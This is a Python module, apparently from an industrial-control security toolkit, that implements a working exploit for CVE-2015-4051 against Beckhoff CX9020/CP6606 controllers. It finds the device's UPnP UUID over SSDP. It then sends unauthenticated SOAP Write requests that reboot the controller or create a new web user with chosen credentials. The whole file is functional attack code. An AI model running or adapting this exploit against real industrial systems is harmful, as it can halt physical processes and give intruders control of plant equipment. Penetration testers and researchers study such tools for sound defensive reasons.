"""Beckhoff CX9020/CP6606 web-based exploit (CVE-2015-4051).

Exploits unauthenticated UPnP/SOAP web interface to:
- Reboot the device
- Add web users

Ported from Python 2 to Python 3.
Requires TwinCat UpnpWebsite < 3.1.4018.13.
"""

from __future__ import annotations

import base64
import http.client
import re
import socket

from scadaver.core.validation import require_ipv4

INDEX_ACTIVE_REBOOT = "1329528576"
INDEX_INACTIVE_REBOOT = "1330577152"
INDEX_ACTIVE_USER = "1339031296"
INDEX_INACTIVE_USER = "1340079872"


def _get_uns(target_ip: str) -> str | None:
    """Discover the UPnP UUID of the target device.

    Args:
        target_ip: IP address of the Beckhoff device.

    Returns:
        UUID string, or None on failure.
    """
    msg = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        'MAN: "ssdp:discover"\r\n'
        "MX: 3\r\n"
        "ST: upnp:rootdevice\r\n"
        "\r\n"
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(10)
    sock.sendto(msg.encode(), (target_ip, 1900))

    try:
        resp = sock.recv(1000).decode(errors="replace")
    except (socket.timeout, OSError) as exc:
        print(f"UPnP discovery failed: {exc}")
        return None
    finally:
        sock.close()

    for line in resp.split("\r\n"):
        if ":uuid" in line.lower():
            return line[9:45]

    print("Could not find UUID in SSDP response.")
    return None


def _soap_write(
    target_ip: str,
    uns: str,
    index_offset: str,
    pdata: str,
) -> bool:
    """Send a SOAP Write request to the CX config service.

    Args:
        target_ip: IP of the target device.
        uns: UUID of the target.
        index_offset: IndexOffset for the SOAP action.
        pdata: Base64-encoded pData payload.

    Returns:
        True if the request returned HTTP 200.
    """
    soap = (
        '<?xml version="1.0" encoding="utf-8"?>'
        '<s:Envelope s:encodingStyle='
        '"http://schemas.xmlsoap.org/soap/encoding/" '
        'xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">'
        "<s:Body>"
        '<u:Write xmlns:u="urn:beckhoff.com:service:cxconfig:1">'
        "<netId></netId><nPort>0</nPort>"
        "<indexGroup>0</indexGroup>"
        f"<IndexOffset>-{index_offset}</IndexOffset>"
        f"<pData>{pdata}</pData>"
        "</u:Write></s:Body></s:Envelope>"
    )
    path = (
        f"/upnpisapi?uuid:{uns}"
        "+urn:beckhoff.com:serviceId:cxconfig"
    )

    conn = http.client.HTTPConnection(target_ip, 5120, timeout=10)
    conn.request(
        "POST",
        path,
        body=soap,
        headers={
            "Content-Type": "text/xml; charset=utf-8",
            "SOAPAction": (
                "urn:beckhoff.com:service:cxconfig:1#Write"
            ),
        },
    )
    resp = conn.getresponse()
    result = resp.status == 200
    if result:
        print("SOAP Write succeeded.")
    else:
        body = resp.read().decode(errors="replace")
        print(f"SOAP Write failed (HTTP {resp.status}): {body}")
    conn.close()
    return result


def reboot(target_ip: str) -> bool:
    """Reboot a CX9020/CP6606 via unauthenticated SOAP.

    Args:
        target_ip: IP address of the device.

    Returns:
        True if the reboot command was sent successfully.
    """
    require_ipv4(target_ip)
    uns = _get_uns(target_ip)
    if not uns:
        return False

    print(f"UUID: {uns}")
    if _soap_write(
        target_ip, uns, INDEX_INACTIVE_REBOOT, "AQAAAAAA"
    ):
        return True
    return _soap_write(
        target_ip, uns, INDEX_ACTIVE_REBOOT, "AQAAAAAA"
    )


def add_user(
    target_ip: str,
    username: str,
    password: str,
) -> bool:
    """Add a web user to a CX9020/CP6606 without authentication.

    Args:
        target_ip: IP address of the device.
        username: Username to create.
        password: Password for the new user.

    Returns:
        True if the user was added.
    """
    require_ipv4(target_ip)
    uns = _get_uns(target_ip)
    if not uns:
        return False

    concat = username + password
    full = bytearray()
    full.append(16 + len(concat))
    full.extend(b"\x00\x00\x00")
    full.append(len(username))
    full.extend(b"\x00" * 7)
    full.append(len(password))
    full.extend(b"\x00" * 3)
    full.extend(concat.encode())

    # Pad to avoid trailing '=' in base64
    while base64.b64encode(bytes(full)).endswith(b"="):
        full.append(0)

    pdata = base64.b64encode(bytes(full)).decode()
    print(f"Adding user '{username}' with SOAP payload")

    if _soap_write(target_ip, uns, INDEX_INACTIVE_USER, pdata):
        return True
    return _soap_write(target_ip, uns, INDEX_ACTIVE_USER, pdata)
